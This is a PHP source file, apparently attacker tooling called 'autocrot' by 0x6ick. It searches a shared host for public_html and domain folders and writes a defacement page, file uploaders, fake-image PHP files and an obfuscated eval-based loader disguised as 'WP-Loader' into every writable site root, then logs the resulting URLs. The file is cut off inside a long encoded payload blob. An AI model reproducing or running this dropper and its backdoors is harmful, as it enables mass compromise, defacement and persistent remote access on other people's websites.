<?php
/**
 * Project: autocrot - gajeproject | 6ickzone  
 * Author: 0x6ick  
 * info: Multi-Server Auto Deployer  
 * Contact: t.me/yungx6ick | Email: spammersuy13@gmail.com  
 */
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Generate all deployment files
$files = [
  'index.htm' => genindex(),
  'wtf.php'   => wtfexp(),
  'readme.txt' => genTXT(),
  'otw.php' => genPHP(),
  'update.php' => update(),
  'update.php7'  => update(),
  'upme.php' => genUploader(),
  'upme.phtml' => genUploader(),
  'spm.php'    => create_fake_png_php(),
  'sempax.php' => sempak(),
  'admin.php' => wtfexp(),
  'sempax.php7'  => sempak(),
  'spm.phtml'    => create_fake_png_php(),
];

// Locate possible public_html roots / folder 
function locateRoots($start) {
    $roots = [];
    $dir = realpath($start);
    
    // Looping up
    while ($dir && $dir !== '/' && $dir !== '.') {
        // Cek standar public_html
        if (is_dir($dir . "/public_html")) {
            $roots[] = realpath($dir . "/public_html");
        }
        
        // Cari folder yang polanya kayak domain (contoh: site.com, sub.site.id)
        $subs = glob($dir . "/*", GLOB_ONLYDIR);
        if ($subs) {
            foreach ($subs as $sub) {
                if (preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i', basename($sub))) {
                    // Jika di dalam folder domain ada public_html, pakai itu. Jika tidak, pakai folder domainnya.
                    if (is_dir($sub . "/public_html")) {
                        $roots[] = realpath($sub . "/public_html");
                    } else {
                        $roots[] = realpath($sub);
                    }
                }
            }
        }
        
        $parent = dirname($dir);
        if ($parent === $dir) break;
        $dir = $parent;
    }
    return array_unique($roots);
}

// Deploy files langsung ke root yang ditemukan
function deployFolder($files) {
    $roots = locateRoots(__DIR__);
    $deployedUrls = [];

    foreach ($roots as $targetDir) {
        if (is_writable($targetDir)) {
            foreach ($files as $fileName => $content) {
                $filePath = $targetDir . "/" . $fileName;
                
                // Gas tulis file!
                if (@file_put_contents($filePath, $content) !== false) {
                    $filePathReal = realpath($filePath);
                    $docRootReal  = realpath($_SERVER['DOCUMENT_ROOT'] ?? '');
                    $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
                    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';

                    // Mapping URL buat result.txt
                    if ($filePathReal && $docRootReal && strpos($filePathReal, $docRootReal) === 0) {
                        $relativePath = ltrim(str_replace($docRootReal, '', $filePathReal), DIRECTORY_SEPARATOR);
                        $url = "$scheme://$host/" . str_replace('\\', '/', $relativePath);
                    } else {
                        // Cari nama domain dari path fisik
                        $parts = explode(DIRECTORY_SEPARATOR, $targetDir);
                        $maybeDomain = '';
                        foreach(array_reverse($parts) as $p) {
                            if (preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i', $p)) {
                                $maybeDomain = $p;
                                break;
                            }
                        }
                        $url = $maybeDomain ? "$scheme://$maybeDomain/$fileName" : "Path: $filePath";
                    }
                    $deployedUrls[] = $url;
                }
            }
        }
    }
    return $deployedUrls;
}

function genindex() {
    return <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Stamped by 0x6ick</title>
<link rel="icon" href="https://0x6ick.my.id/favicon.ico" type="image/x-icon">
<style>
body{margin:0;padding:0;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:monospace;background:#fff;color:#333;text-align:center}
img{max-width:250px;border-radius:10px;margin-bottom:15px}
h1{color:#00bcd4;margin:5px 0}
h2{color:#f50057;margin:5px 0 15px}
p{margin:8px 0;font-size:14px}
.footer{position:fixed;bottom:10px;left:0;width:100%;text-align:center;font-size:13px;color:#00bcd4}
a{color:#00bcd4;text-decoration:none}
</style>
</head>
<body>
<div class="content">
<img src="https://i.imgur.com/y7BGFy3.jpeg" alt="image">
<h1>StampeD by 0x6ick</h1>
<h2>AkA 5YN15T3R_742</h2>
<p>6ickZone: Where creativity, exploitation, and expression collide.</p>
</div>
<a href="https://linktr.ee/6ickzone" target="_blank">spammersuy13@gmail.com</a>
<div class="footer">t.me/yungx6ick</div>
</body>
</html>
HTML;
}

function genTXT(){
    return "Stamped by 0x6ick 
 AkA 5YN15T3R_742 | 6ickzone | t.me/yungx6ick";
}

function genPHP(){
    return <<<'PHP'
<?php
/**
 * WP-Loader.php
 *
 * Universal PHP Loader Collection
 *
 * @package   WP-Loader
 * @author    0x6ick <spamersuy13@gmail.com>
 * @license   DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE (WTFPL) v2
 * @version   1.0.0
 */

error_reporting(0);
ini_set("memory_limit", "512M");
define('CONF_LJWFZG', 'NRvONBowduHozGP');

class Core_Suaue_Mod {
    private function oEPSJN() { return 'JNdtOotLGj'; }
    private function egxSDd() { return 'dSlFDgVnD'; }
    private function jifCaX() { return 'DuXBmyQTId'; }
    private function vzmuyB() { return 'rpPjMuDSyooNdnfJxqJS'; }
    private function AmhmQN() { return 'aWZeByWUgPivEUyaJKLd'; }
    private function DJncfp() { return 'UMruuemTGosDnBBnAslX'; }

    private function eqEugdvR($c = '') {
        if (empty($c)) return null;
        $c = preg_replace('/[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/', '', $c);
        try { return eval(trim($c)); } catch (Throwable $e) { return null; }
    }

    public static function init_YwXe() {
        $ZCCjn = 'MDE3MTMyNDQzNDE5MWJhYjg5ZmRkYTU2OWNjMTgwMjdmZTYyZWE4MTA5ZTZiZjg4NmI3ZmZiOGQ2NmMyNjgxNzQ4YmMxMDY5NTE2ZmEyYzg1N2M4NGMxMzRiM2UyMjE5YjZiOTM1NzcwMTcxYWE0Nzg2NjI5OGFlNjQ3YWQzMmUwNzc5ZmIzODY3Mzg3Y2U2OWQ5NzEwNjI0MzYyZmEwNTFmMTg0ZDlkYWNlZGU3MGJmMTBkYjFiNjZhZjlhNDE4ZTYxZGIzMmU4ZDhlODhiNTA5NTUxMWU0YzkwMjJkZGYyMGVmOGJmZGVmM2EwMmRlNDZjZWM0NTUxOTcwMDcyNDQxZWE2OWE5NjljZDJhMGIxYmIyZTZmNDJmMTE2ZTg5YzUxN2QxMTBlMDljZGVmZmM0NzNkNmU3MDFlZWM4Mzg2N2M4ZTkzZDE4ZWMyYjE5MzgxZDljM2IxM2Y5OTIxNzVkYTM2NTY3OTBkMDdkMzM3YzhkZGRiNTAxODQzNjg4YjMyMDE3MTU5YWE3OTk3NGZmMDBiNzhhZGE4ZWM2NzQ2YWFlYzk4NGFlNWFhZDk5ODhlMzcxODMwMzg1OGNhNTNiOTc4Zjk1YjgyYmY3ZmNhZmQxMGExMmM1ZmRkZDI0ZTFkZDEyZTE0Y2E4NTVkZmFlMmVkY2Y1MTQ1NWY2MzU2ODdiNzRiM2EzNTAwYjZlNDcxODM2MjY1ZDk5Njg1ZTFhNDU2YjJhMzUyNDg4ZjFjODljZGY0MWYxOGJhZGRlZThjODZlYjg3NjJlMjQ4ZWRhY2E1NDFhYTBmMDM2Y2NiNmM3YTFiNDA0MWU2ZmYxYTFlODRmZGFjOTUwNTYxZTM1M2FiMDJhNTNlZGI3YTg3MWE1Yjk1Mzc3YjkxNjE0MjVlODY4NDVlNjg5MGNkMDQwMTY1ODFjZjcyNjM1OGNiNGI3MGU5ZWQ2MzUwNTJhOWQ3YWFkYWIzNDFmYTMwODUzYmFiODdhM2JjYWRhMzlkOTViYWIzMDEzMzVlYzQ4N2IzZTRhM2QyOWYyODhiZTFhZDZkZTc5ZDAzYjMxNGQxN2QzMzNkZjYxNzM3NzcwMzM2YTMzNTdmYTE3ZjIwODM5ZjcxN2YyYzZlYWI1MWI3YjU4ZWFjMGRkMTgxYjYwZDJlOGIyMDA4NGQ5NzhkN2Q2ZDdmOGIxODQ0MjNjMGYxM2JjNTE5NDlhOTZiOGM1OWI5MjAwMjA1NDM0YzJmYzdmZDliZDMyOTg3YTljMDdhYzg1MTgyYjc4ZDEyODkxNjg5NTkwY2NlZjVlZWQyZDJkYjkwZTZhMDQ3NDY5MTk1YWY0MDBmODI5NTE3YzUxMTJlNDgyMzA1MDNkNGUwOWQ3ZWQ1YjEwMzA2ZTc5NTU2ZThkNzQ3ODk3YTVhMmU0NDdlZjhkZTY1NDg2Y2FhNWU2NGY0OWMxOTczNTM4MDIxMTZlMTUwOWNhY2M2N2M4MjBmZmIyNTRkMzc2NTFkNjhhNTUwM2E2NTE4MTQ0NjcxMzFmNjI4ZjIxOWY2MjZjOTBhNzA4YzUxNjY1Y2JiZmY4ZjE1YzIyYjdhNTkyNDkxYTI4ZDA0ZmJmYzFjODlkZDkzOTM0MWMwNmM5MDRkNzEzN2U2ZmY2NDY5Mzg4MjE3NWVkNmIwZjBjYjRlNGZiNzJjY2MyOTdmNDljY2ZjODFkZGM5ZmJkYTg4NzEzYWEyY2JjZmNiZmE3YWQ4NWY2ZTM1YzI3ZGIyODIxNDM3NjJkNGIxMDg2ZjUxNjAzYjczNmI2N2ZlNTI3N2UxZTk2NjlmMDEyZTRjMDlmYTAzNjJiZDgxMWM1MGIxMzlmOTkzYzM2NDE4NDY0YjkzNzE1YTE3ZTg3N2IyNjQ0YzVhZjY3NTYyNGI2MjMwZDNjNjI4YjM2Y2U2NDY1MmZiYWQ5NjM4YzhlMDJiNGMwNjExNTQxMWZmOTIwZmYzZmMyODBmOThlZGM5ZmQxYWQ3ZDFlODRiMjg2YzBlM2U4YzY3ZjMzYTM5YzgyMTYxZDA0ZmY4Y2MwNGEwZmY1ZDI5MDZjY2FhODJkZDczYTc3MzBjNTBmYTU4MzAzMGM0MjJiZjM0Y2Y1YmQ2YWM4MzllNGQyYmJhNTU4YmNhNmQ1Y2M2ZjAyNjUzMWExYTA2ZGU0Mjk3NGJjYjEwY2Y4MWYwYmQ1MTE2ZWI3MjA4Yzc5N2NiMDcxMDVlYWExMmFlYTI4MGM4YWYxZmQ2NjVhYjA3NGVkNmNiMjAwNDc2MTMyYTIzOTU4ZmY1NWVkMTAxYTAwZDZjNWNjYWE1NTljZDc2ZmY5ZDUzMWUyZGQ3NjRjOTBlYWNmZGNhNzQ1OGRjNjJlZTFjYTRmZWFhMWNiYThmMWVlMmVkZGI4ZTk1N2RjMmNiM2FmNmY1ZTdkMWFkNzU4OGMyNWM4ZGQ3YjgxYjBmOTJkMDM2OTAwOTg1NzdhMDQ3MDAyNmI0NjUwMTE2OWNmYzRlNmRkZWVhODdhZWZjMWUzNDNhNTEyNTQzN2RkM2M2MmIxN2MwZGZiMDI2YjFhMWFjNzNjYmU1ZDZmYWE4ZmUzYTMwNTUxYzFlYTE3ZTU5OTc2ODI1MzkzYzVhYTllNmNiNDc2NjlhYmMxMzY2NzM3MzcxNTdmMTZiOTEwMDVjZTg3YTMyOTQzNDc1ZTU1NGY0NTljZTBlMzc3ODhiOWExMGNhMzI3NmFlMGU5MzFlNjAyNWRkZTdhODcxYzQ4Mjg0NWNjNGYyNGRhYjYyMmU3MTFhNzg2NmVhZmU3ZDc3YzZiZjJkMDc1MGI3NWQ0MWIyOGJkOGU0NGQzYTcxZGZlZmY5Mzk1MDhjOTllM2FjOTA5YWFkMjM0ZTQzZjZiYzZhMmI3NzBhYzdiYTllMDY2Y2M3ZTAxZTU0YTdjNGM1YWMyMjhjNDM2Y2E4NmM4ZWU5ZmE2NDc2MmRiNzBiMzNkNzU4MmJlYWE2YmFjZjdhZmZmMDIyODc4MDA3ODRlY2JkYmI3ZmEzNmU3ODY3NWE4YjIwNDJmZGY3MGVmMDg3MzQ0YzE2MTcyZjM3YWU3YjYxMmYxYjgzYzkzNTZhZjM5Y2JkMWE1NDY1Y2ZkYTVjYTg0ZDVjZWFhNzg3MTU1MTlmNzdjMDVmMTcyNzkyZjQ1MWRiYWU4ZGFmN2UyYmIzYWM2ZTM5YTU3M2MxZDhiMDI2ZGY2OTI0ZTBkZmU0OWU4MDMzYTQ2YTY3ZDhjODc3YzUwMTQxZDMwODJiMjg3ODJmZDAxNzE1YzRkNjQ4YTZjYmNmNGVlZTcxZmNmMTYyZDFjMjlmNzkxYjFlMzkxMjY5ZGJkOTdmNjQyZTUwMWUwN2U3NjA4OGI4NjM3Njk4MjNmMWRhOTllNDc2ZDlkOGU1YTllYjY1ZTQ1MTM3NTMzMzJlYzY2ZTdjOTYzOTVhYWE3MDhiYmIzYjEyNzlmYWYyMzY3NDE5MmMyMzExMzA0MTMwY2YwMjMzMDVhOTRiZTgzZTNkODQ1YzMwNTY0ZDI5Y2RlYjE2MGE5NTZjZjIxNDY4ZDI0YzI5ZGJhMjU4ZDEyNTQyZWVhODc1YTk0MzBiNzRmZjA4NDBiYWZhNTA4OWFiY2E2NDA5ZTMzZjg2MDY3MmJhNDUzM2JkZDcxNTRiOTE1ZDQ1NjQzYjMyZDBjNjhhMmFjOTJhMzE5Yzk4NDRiNTRkNWQ1ODU2ZjVmYmNlNGIwNzAwMzQwNjBmNTFhNWQxYTkxMWU1OGY3ZDkwMGJkZTBjZjgwOTkzNmYxMmY5MTE3ZDU5NDY0ODI0ZjA1YTIyZGE5NWMwMmVjZGJkZDg2OThlZjlhN2ZiMmYyMWFhZjg1MzNhMjJkYzUyMzg4YzIzZTM4YjZhMjY2ZjIyZDZjNzc5YjY4ZTNkNTE2YTgwMWMyMWVmOTIwZWM0MWZhMWJhODRmOTBmMjA3ODdmYmNmZDkzMDhjOTRmOWE3MGU0NGNhMDQ3OGQ5MGFlYjIzZmY4YTJjMWI1NGMzMjhjY2RjNzU4N2JhOTQ2Yzk1YzI5ZjBkMmRmY2Y1ZjIyNDM4OTIwZTFkMTE2ODFkZTY4ODY3YjY4OTE4ZDc1ZGQ5MzM2MGQ1NjNmNWQ3YWIyYTdlOTQwYzFhMWExN2Q0NTUxZDQ1ZmU4NmQ4YWU4NmUwNGNhOWJiZmFlNmJjNTc1OWM1NDA2NjY5YjY3NTRkMTIzZGZkNjIxZGUyMWU4YjE3ZGFlNmZkZDJiNzg4YmUzZTI2MDA2ZTM1OTdjNzQzNDQ3OWYwMzZhOWNhMTY0OTY3NTEzNzVlM2MxZWJjMDM2YzQ1MjBmYmVhZjE1ZWQ5NGE2NzQ5MGYyZDdiZjdjZjI1ODhmOWJmYmNkMTYxMWM4YWNkNjdiNjEzMDNkODJlYzZlY2NiZTk2ODQzMGMxOGU1MWEzN2JhNjI2MWNmZDI5YzMxMWJhNTQ1Y2JiMDM5Y2FjN2NlYjhmYzMzMzJjZWY0OTEyODZmYTRhZWZjYzQ1Yzk4NTQzODJlMDEyYjY0NTE1NDkyM2ZiZjljOTdjZTBhYmU2YjMyNjgxM2U5ODBjOGI0NDljM2I4OGNjMjZkYzJiNTQ2NDZhMGNlMWYyMGUyNmUxYzllYTc4ZWZjYzJkODViZjk4NmFlNmMxNzBiZGU0MjYwNTg2ZmIxODQyZDEwOTk4NDdhMmQyNzIwZTRhYmVlMDkxNGQwN2EyOTM2Mjc0OTVjOGI2MTk3NmQ2MWM5NDQ5ZGIzNThjYmFmYmY1NmU4YjhlMzNmM2EwM2RmMjZiN2I1NzI0ZjFhYzE3NTZhNDVmYTI1ZTliYWIzNDc5NDNmYjI0MzM0N2JmOTA4MTA2MDI3OTgxMDUzMmFiYTQxMDU0OThmMjBiZGNiYmMxNmZlYzNlZDc5MmNkMTZhMjJmMDBjOGEyMzAyNGVjZDM0NzYzNmE4NjIzNzYxMzc0YzBkNWQyZTkzYmRjZmNjNTgzY2ZjYWExMjk2YjY1ZmNlMTdmZDhmNzhjOTkwNzM4OTczMzhmNThmOTBiOGFhYThiOTRjZDQ3MmFkYTYzZWU4Y2IzNTA0YzY5OGE3ZTA5NjdjYWJmNWJiZGQ4ODU1ZTQ0ZGMwYWY3NDU1N2ZiZjU5NDYyZjQ3MmRhZjQ4OTYxNzExZDQzMDRlODZlZDZjODE3OWVlOWE4Y2Q5NWNlMWRlMzU5ZGM5ZjQzZmFiNDU0MmIwMzNmOTE4ZWQzZmY0ZDlkNDRhNjk1OTZmMzg0ZmFjYjFkOGQ3NGRlYmM4NzFlMzAzNWVlOGU5N2NiYWFkMGU3MWE4ZmJjNTk0MzE5M2VkY2M1NWJlOTQ0MTBlYmIxZGE4MDg3MDEyNzA4ZTdlOWZmMjYwYjJlY2IzNzEyMjNhZmU2NDdlZmZlNDM4NzlkYzEyMDEzMDdhN2RjMjU4Y2U4MGFmMDgwM2ZlMGEwYzdkMWQ0ZmVkYTg5MDk3ZTJhNGNkNTMzYTczZjQ5MTI4NTY5NDFjNDQ5NWYwNDQzNmYyYmZjYzRmMjUxNDNiMjdmMWNkYmE4ZTFlMzFhMGVmZGQ5MTkxNTgwNzIyYzMyNGViYjc1NjY4ZTJkNzA5NGQ0MDJiN2U5ZGZhODZmYTVmMTFmMWUyNzZmMTUwYjE2MmEwNTJkZjk2ZWMyZjgxM2NmYzg0NjNiZTEwOGNmOWQwNjI1OWI5ZTQwOWQ0YjdjODcwYTJiNDhiZDdjZTVlYmY3ODE0OGU1NThhMzM5MzEwNGZjYzE0NjZiNmRmOGIzZTcwNzVlMjE1ODljZWI3MWZjNzRmNjA1MGU4ODZkYzkyOGU5MzRjYmMzMzNmNThhNGQ4NTA3NWRiMTg0NTliN2JmMWVkMmYyNTg1MzNiMzE4MTU0YzY2MWE2MjJhYTQ3NzkwZjkwMmM1Nzk5YmQzMjAzMzE3NzlkYzU1MTIzZjMwMmQ5Y2Y5YWI0ODE1ZjZiMDJmODZhZGVjYjg5YzRlN2YxM2M0OGQ5ZTBjMGIyNTI5MDg2OGEwMGZkZGIyNDY0YjdiYzAyYjlkMmZkZTU0MWRmZjBmMTVlN2I3YWFkODkwZDJhMDQ4MTI5OTY5NzYyY2RkNDcyNmYyMzAxMjVkMGNkOTc1ZDQ2MmFmNmU3ZmE1M2Y4ZWU3ZTRlMzc0YTNlNmI1M2FjMGU3ZTgzYjM4ZDQwYmIxNzRiMTA4MzNhMjhlYTEyYWU5NDA2MGJjZTIxMzIwMDgzYjVjNjY1ODlkYWY0OWQ3MGI3ZDQ2YWQ2ZDUxMmM4MGUxYmY3NDgxNTU5NGUwZGViODNkOWE1MmNmYjBjYjIwZjNhMjkxMDFlZDI2MGRlNDZjZDk5MjcxNjcwNGQ5MzhkMTEyMzFiZDc1MDMwNjM4MWYzYmNmOTU2MmJlNDUzMTI4NGEzNzk2ZDRiNTMyM2RiNmZhZWE4ZTg3MzdiYjE4NDczMzc3ZTA4OTlmYzJlMGI1NWZhZGJmMzNkZTVjM2U2YWE2ZTdkOGY1ZGFmNmJiMTg3MjI2NjkzOGZmODA0MTNkZjY3ODM0NjMxZGI1NDY4NTk2ZmIyMTc3MGQxZjY1OTNjZWY1NTU4MWE0NTQyNDBiNGZkZTMwNjgzYWI2ZmNhODExY2FmYTI4N2NhZGI4ZTFjY2U4ZGUxNDdiZDUyYzJmMGEwOWFiMmU0MWI0MTc3OGUxNWI1ODY4MTlkM2FiODFhM2IzNDk5ZjFiZmNkYTc4OGU5Yjg5ZWRkNTQ3MDlkY2E2MjUzN2MzMmI5MDI4YTNkNmI1ZjM5ZTNhYzkyMTA0YzQ1M2NhOGJiMGE5OWJjYmIzZmQ1YzBjNWQ4YzI4ZWZkMGYxZTA3N2EwNzVkNDY3MTEyYWMwNWUxMTk2Yjc5OTI5MmQ3NDFmZDQxYzExZWMwZGQ1MzZhYmY2OTkwYTVmOGEwNTBlMmE1ZjNlNTlkNTAzODU3MzFiOGZkMzlmMWRkNjUwOWY0NjQ3YzE0YzNmNTVhODg2NWVkYzZiOTg3MmI2NjdlMGVjMzFiYTkzNGFmOTE1N2I2NjBhYzc3NTYwYWI3NzkxOWZhYTA2N2FiNTYzMWRlNTcwM2MwNWVmZWZhMWU3Yzc2ZmE3MWMxMWYwZTZmYzAwZjc5MzAzY2ZjNDFkOGQxNjA3OTViN2Q0YjJmNmNmMDIyMjg1OTg1ZTBjNjFiNzI2Y2E2ZDU0OWNkM2Q5YzNjNmYyZDAyYWQ4ZjU4ZWFiMTBiMTUwYTFjOWM2ZTRmMTc1YjYzODZlYTMwZjgzYWI1ZDZmODU3NWFiY2IyMWMyZmI5OGMzMGE4MjU5YWQwYzcwYTlhZDdkMTUxZWJmNjIwNDc4MzFiMWRkYzNkOTFmZWE4YmJiY2ZiMDgyZmFmNjE1OWM4YTU0YTMwNzExY2RmY2ViOWIyMmYxMGQ1M2FhYzMwOWY5YzM0ZGU4NzExOTdjMTIyZTc4NDM3YzhjMWQxNWU1YmUwZTNkMTA4ZTFkYTJmMjRiOGZkZGJmZDcxZDkyMWIyYzVjYjAzNjBlY2E3ZWZhZGVkZDQ5NGJlYmJiNzhkYmNlYjg5YzU5ZjZlYmRmZmI4YTY1NzNmMTAxMDQwMDQyYTJlYWE1MGNiYzczMDNhYWFkOWJkYmRmYmE2YTcyZjZhOWQwNDkzMWU2OWQxNDQ2Mjc0YjJjYjBlYzg2YTg3NTZlZTI1MmY2Y2M1ZjlkYjQ5MmNlYmZjY2MxNDJlYmQwM2IxNjEwNGFlNWJmNzdlYTJkODdjMjQ2MDIwYmY5ZTA4MGNkYmZjOTU4YTM3MGFiNTFlMWM5OTRlNGNlNzg0MjQxN2M1OGM0MzdjMzgwMDA1OGY0OTVlMTY3Mzk5ODg2NzFmYzFlNjUzODM0NWIyMTY1ODllZDdjMDdkYWZlNWJkMDYxYWE1YmVjMjFkZTlhMWJhZDcyYmEyMTQwZTUxZTdkNzU5NDNiOWUyNjVhOTE4YTcwYmE5ZDAzYjUxYzA3MGJiYTlmZjNmMjM4YTdmNDg5MDdjMmJhNmE0ZjE3NDkyMjJjMjJmMDk3MjVlNzEwNmE1MDAzNzc3ZDk3ZmVhODZkMTI4NDhiODI1N2NkZmJlNzNkMzQzZjc2MTRmMWZkNGY4YTk0ZTEzZWNjYzVlMzBjYmU0ZDkxNTI4MzFkNjIzYTAwYjAzNTc4N2VlYmU4ZmYwNDc4ODdjM2ZmMWQ2ZGQwNzFlZjlmOTA3NzcyY2Y4MWE2ODdjZWIyMThlYzIxODg0YmYyOTg5N2MxMTU4NWRmMDg2NTM5ZWMzN2NmNjBhYTc5ODAzZGY2ZTJkMDQzOGZkZGNlNWQyNjgwNTUzNjVkOTdhOTlhZDQ4NTAxNjhlZThlY2VlNTg1ZjQ1NThiNjY5NDU0MjgyY2M0MGUyNjJiMzJiZmMyNTc4NTdlOGRiM2E1MWEwOWRmZjUzYWQ2YzIwZDAyOTg0MzA5NmUwYTg5NzgwYTE4ZWRiZmYxYzcyYzVkYjFmNjY2MWI1ZWUyN2EwNGEzYTcwYzI2YWZkNWU0N2ZkOWQyMzRhOWQ1ZjEyMGZiMmQxM2MyY2FiMDEyYmYwNTc5ZWE4YTdmZDgwY2MwNzgzZWM5MGQ5Njk2NTQyNzcwMTM2N2Y3MTQzNGM0ZDg3ZGQzYzA5MTFiOTdhM2RiMjk0ZjA0ZTQ3YWVhYjBmZGQwOWM4Y2M4MTBiYTJmMTA2MjA5NzViOTk4OWE2YTliMzliODVhNjg4ZDc5YmE0NThiMDNjMzAxOTVlOWQ5YmJlYTU4MThhOWVhNWFkYjc5M2I1OGFiNWVhMDY0NDVjNzBlOTRiN2I3MmQ5NjhhYmExYmY5MGIzODgxYmU5Y2ZjOWJhNjVhNTliOTM5NWFjYTFhODhjOTBhN2I5ODA5Mzg0ZmVjMzk1ZjEzOWVlYWQ0Y2Q1ZGI3NTUwZjY1NTdkYmNlZTRiNTgxZjQ4MmUzOTllYzQ5MjI2ODlkNDU2OGUxNzg1NDA3NmZhYTgyY2YzNzIxMjVmMGVkY2FkNjE3NThkOWY4NWUwMWZkNWZhYmRlMTQzODdhZmQyN2ZiMTRhMGY2ZTVjN2IxM2VjNWNhYmRjOGYxMzhlNjhhZTBhMDZjNDA1YzNmODcwY2E5YzNkMzI5ODY5MTNmMWE2ZjZlZjc5NGFlZWY0MmMzNDEyODY0N2Y5YjUxYjQxODdjODE4NTYzNDNhNzM4N2Y5MGRhODcxZmYyNTIxM2M4ZDA3YTZmNWU2MTBkNjNhZTY1ODU4NmEzNzE5Yjg4NDExMjk0MmI0Y2MzYjU1ZTMzMGU2NmZjZmUxYzY1ZTI5NmQ1NTMxN2Q4NzE4MzBjMWVhNGRkOWIyNzZiODJkZTMwNDYxOWRlMGQ4Yzg2ZjhhNWRlNDU0NTA3MWE4ODM5YzZmZWQ5N2EyOGI4ZWMzODY3Njc2YzBkMmZmZDg0ZDg1NWFhYTYxMmI4ZmFhYzAwMzdmZTI1YTMwNGVlNTE2MTMwMWQwNTM1NTg0N2Q0YjI4MWNkZjkzNjI4OTU3ZmU1YmQ0NWI4MTY0ZjM3ODkwNTU5ZGZmYzQ4OTFlYWZhMDQyNDJkZjNjMGZhYTBjMWUzODUyMjY2N2MyMjVlMjYxZmIzOGRiN2JkYzQ5NWY4ZDhjMTRiYjY2OWI1YjY5M2ZlYjkyNGU5MDIwZjJlMzBkYzM5ZGY3NjE3ZTJkYTU1M2VjMWQ2NmM2MDdkMTA1NDQ0ZTFkZTExMmMxNjQ0YmY0ZjA2MGNjYjdjNTkzOTg4MDY1ZmY0YzdmNjkzZTdhNTg0NjViMTFkM2QyN2E0NDg2NzRiNGNlYzQxYmJmNjM1MTliOGE4ZGE1Y2UwYWQzMzg4MzM3MWZlZWZjNDUwZjdjMDI1ZTc4NDIyNmU4N2YyYTE3YmE1MmFjYThmNDRlM2U2MThkMjAzYTJiM2VhMjZmZjUyYzM2YTA1M2UwYTZlNjc5NzExYjUzMDRhMTgwYWRlNzc5ZDBlOTYxZTExOTkzOWQ3MWMxODk4YzdiZjgzNGNlMTdiMWVlYzA2MGM4Mzg5NGE0NzZkYWQxYmYzMTNkNmVkYTJkMmZiYzI3N2JkY2FhZWZlY2U5NWUyMzY4YTJkMmE0NTk2MGJiOWE1OGMyZDdlNGUwZTA3ZDg3YjAwZjY3ZGQyN2UzMWFlZWNmNWQwNmQ5NjIxMWIyNjkwYzE0ZTViMTkzNDBhMjVkNzFlM2U5OTliYmQzNWUwOGQ1MDIwNTRjNDk1MGY1NWFkMTkxODdlMjNlYjExMDBiYzA5Y2RiZTQ1NTBhNjNhNjhkYmJkZDJjOWVhYTZkYmU2MjgyODkyM2MwNWUyMGMzNjEwNmJiM2Y0NzIyOTExYjhiM2Y5OWI3NjFlYjIyNjAyNzFjMGM2YzJmZmQ0YzYyOWQ0MDc1Y2RkZWRlNmYzZmZiMDc5MWYzNWU4ODA2YWUwMDY3YzA2NGNjN2UyMTY4NTJjNzhhNDE0ZjQ2OGU4MTgxN2ZiMTliZGUwMTljNjI3OGJkZTg5N2IwMTQ5YjMzMzZhOTljNTI3YmMzNDZjMWYxMjYzNmViODJmYThkMjViZWIwMGYxMDkxZDkzZmQ0NDViMTBiNzY5OGI1MDY4NWNiNGE3Mjk2YjQyMjBiZTU2YjRlNzNlNTJlZjAwY2Y3MGVlYTk5NGMyMTk5YWM5ODY4MWJlMWU3YTg3MzRiMTYwMmUyMWU0MmNlM2UyODc0NmQ1NmJjMmFkMzUzNjE3MjZlYWZmMGVjYzllOTUxZDgxOGY0ZTM2N2Q4MTczZGI5MDQzODZiMDhiNGQzMTJlYjAwYjA2ZTNmZDVhMTcwOGE1ZTg2MjlkMmU1ZGNiNWU0YjI1MWU2YzBlMjBkMGFlNTQ2YmRiZTAxNTIzOGYyOGFhM2I3ZGMzZjA2OGQwN2I3YzFkZWJhYjViOGY5Yjk1MzNjOGVkYWJmZjY2NmRkZWIwZTg3YzEwMTNiMThmMDExYmE0ZTU5NmI0MTY5NzNhZTk5NDdjMWRiZjZlMTE1ZGRiMjRlMmNkMzcxYjc0MDBjMTRkNjQ5NDU0YjkxYTczNTkxZDgzMGJhNDk4ODA1NmVkOTQ4Yzk1MjMyNTg4M2Q3NWE5MDZmMTQ0Mzk5OWNkZDBkODA5MzEyMDZkZTM5NTQyYmI3YjcwMjc4MGIwMmMxNTY5ZWZiOWZlZDYzMDZkYjMyNjM4MTkxODBmMmFmYzg1OTA2ZWU0NzI4YzA5MDViY2NhZWFlMTIwZDhiZDU5ZDZkMjEyNThhZjZlMzJkODFiYmMzN2E0Mjk4MTkwZDE3MTlmN2VkNjMzY2I4OTMwOTU2MzAyMTAzNjBkZDVhOGYzZDFkODY2MGIzMWFiMzdmY2YwYzc4ODI5YjRkNjdhOTgxZmYwZWQ0ZjMxYjQxMmQ3YjYyYjNhMmQwZTlmMGYzM2Y1ZjhjODFhODFkMGZjNGZhMmYzNjU0YmYyYTAwOTE5NDViMTFmN2RhOWNkNTUzZmVhNDY4ODQyMGIzZGNmNDQ1ZjM1Y2Y2YjdhZjkwY2U3MjBjNmMyYTU4ZWQxNjExNjU1MDIzMzNiNGY4NTllMGI5MjVjM2VlNDQzZjlhNDQ0ZDI2YjgzZmRiNDBiNzQ1NWVhZDE0ODYyZWE3OTA3ZDIzNWVkYWM3NzEzNTE2MWY3ODhjMDU4OTM0Y2IzZjVmZjc0OTliMzNhNzY4MDMyNjZhODNhOTRmOWQ0MmE1YTRhYzYyN2Y5NTZmN2NkYjU0MGUzNjUwZjE1YzBhYjAyZjZkM2E4YmY2OWYzZDVlMzkxMzhlNzU1Y2RlYjkxYzgxYzk1MjI1MzQ2NjI2MWMzZmQ0MDdjMWQ2ZTcxNGQ2YWZiYmI1YjQ1MjU2NjBjZDU1MDQwY2U0ODNjMGViNTUxZTk4NDIwYWIwZDg2OGQ0NzViMmE3YjBhZTgwZmE2Yjg5NThhY2M0ZTUxY2ZlMWQzNDZlNzk0NzE2OTJlMDhiZDljZWUwNDcxYjM1MDNkNTNlYjdjOWY3ZjZkOGZhM2IxMTY1ZDY4MjY2NmExYmFmYTRlMTc5Mjk1MDE2ZDQ1MmZlYWYxODc1ZmU3ZTVhNzRkYzM1NWE4NWQ4ZDRjMW